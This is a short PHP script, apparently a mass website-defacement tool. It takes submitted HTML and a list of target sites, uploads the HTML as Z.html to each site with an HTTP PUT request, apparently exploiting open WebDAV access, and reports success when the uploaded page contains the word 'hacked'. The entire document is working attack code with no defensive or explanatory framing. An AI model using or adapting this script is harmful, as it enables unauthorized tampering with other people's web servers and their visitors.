<?php
function curill($site){
$ch = curl_init ("$site");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt ($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt ($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 6.1; rv:32.0) Gecko/20100101 Firefox/32.0");
curl_setopt ($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt ($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
$data3 = curl_exec ($ch);
return $data3;
 }
    $nama = "Z.html";
    $dir = 'webdavfile/';
    if (!is_dir($dir)) {
    	mkdir($dir);
    }
    $isi = $_POST['inputku'];
    $fp = fopen($dir.$nama,"w");
    fwrite($fp, $isi);
   
    $nama1 = "list.txt";
    $isi = $_POST['input'];
    $fp = fopen($dir.$nama1,"w");
    fwrite($fp, $isi);

$sites = $nama1;
$file = $nama;
$fp = fopen($dir.$file, "r");
$buka=fopen($dir.$sites,"r");
$filesize = filesize($dir.$file);
$size=filesize($dir."$sites");
$baca=fread($buka,$size);
$sites = explode("\r\n", $baca);
foreach($sites as $site){

	if(preg_match("#http://|https://#", $site)) {
	    $site = $site;
	} else {
	   $site = "http://".$site;
	}
	$site = "$site/$file";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $site);
	curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (X11; Linux x86_64; rv:24.0) Gecko/20140722 Firefox/24.0 Iceweasel/24.7.0");
	curl_setopt($ch, CURLOPT_PUT, true);
	curl_setopt($ch, CURLOPT_INFILE, $fp);
	curl_setopt($ch, CURLOPT_INFILESIZE, $filesize);
	curl_setopt($ch, CURLOPT_COOKIEJAR,'coker_log');
	curl_setopt($ch, CURLOPT_COOKIEFILE,'coker_log');
	$exec = curl_exec($ch);
	$site = htmlspecialchars($site);
	$su = curill($site);
	if(preg_match("/hacked/i", $su)) {
	    echo "<font color=\"#86E1BF\" size=\"4\">$site -> Berhasil</font><br>";
	} else {
	  echo "<font color=\"#FF8A97\" size=\"4\">$site -> Gagal</font><br>";
	}
}
unlink($dir.$nama);
unlink($dir.$nama1);
